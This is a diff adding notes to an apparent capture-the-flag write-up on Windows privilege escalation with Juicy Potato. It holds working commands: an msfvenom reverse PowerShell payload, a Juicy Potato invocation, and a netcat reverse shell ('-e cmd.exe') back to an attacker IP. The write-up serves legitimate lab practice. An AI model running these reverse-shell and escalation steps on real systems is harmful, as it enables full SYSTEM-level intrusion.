@@ -211,8 +211,40 @@ meterpreter >
 ```
 ## YEA
 
+Found a good video on how to do this and read about the exploit [Juicy Potato][jp-link]
 
+Basic steps were to upload ne.exe to target and fire it off bat to kali box
+
+set up SMB server locally to how files
+
+use copy on windows box to pull over files
+
+use msfvenom to make a batch file wit PS shell back kali box
+
+copy all files over and open new nc listener for batch file to connect with
+
+on win box run jp.exe call the batch file and use random port for the jp.exe to use to make internal connection
+
+```yaml
+Windows BAT Shell
+msfvenom -p cmd/windows/reverse_powershell lhost=10.10.14.87 lport=6768 > smog.bat
+
+Windows Juicy Potato
+jp.exe -t * -p smog.bat -l 4444  (can be any port not used)
+
+Windows NC commands to connect to listening NC from msf6 meterpreter
+──(kali㉿kali)-[~]
+└─$ nc -nlvp 4321                                                                         
+listening on [any] 4321 ...
+
+meterpreter > upload /home/kali/temp/nc.exe
+meterpreter > execute -f nc.exe -a "-e cmd.exe 10.10.14.87 4321"
+
+```
+
+that connection was as system and was able to grab root.txt hash
 
 
 
 [msf6-commands]: https://www.hackingarticles.in/wordpress-reverse-shell/
+[jp-jink]: https://www.youtube.com/watch?v=EkFUzbBSXBo
